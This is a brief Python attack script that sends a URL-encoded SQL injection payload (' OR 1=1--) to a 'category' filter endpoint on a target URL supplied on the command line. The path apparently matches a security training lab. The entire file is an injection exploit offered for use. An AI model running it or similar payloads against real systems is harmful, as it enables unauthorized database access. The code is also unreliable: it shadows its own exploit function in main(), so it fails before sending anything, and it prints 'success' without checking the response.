import requests
import urllib
import argparse
from urllib.parse import urlparse

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target's URL (eg: http://example.com)")
args = parser.parse_args()
input_url = args.url


def exploit(url):
    url_input = urlparse(url)
    full_url = url_input.scheme + "://" + url_input.hostname

    endpoint = "/filter?category=Pets"
    payload = "' OR 1=1--"

    encoded_payload = urllib.parse.quote(payload, safe='')
    exploited_url = full_url + endpoint + encoded_payload

    response = requests.get(exploited_url)

    return [response.url, response.status_code]


def main():
    exploit = exploit(input_url)
    print("Exploiting target...")
    print("-"*50)
    print(f"Endpoint: {exploit[0]}")
    print(f"Status Code: {exploit[1]}")
    print("-"*50)
    print("Exploiting success!!!")


if __name__ == "__main__":
    main()
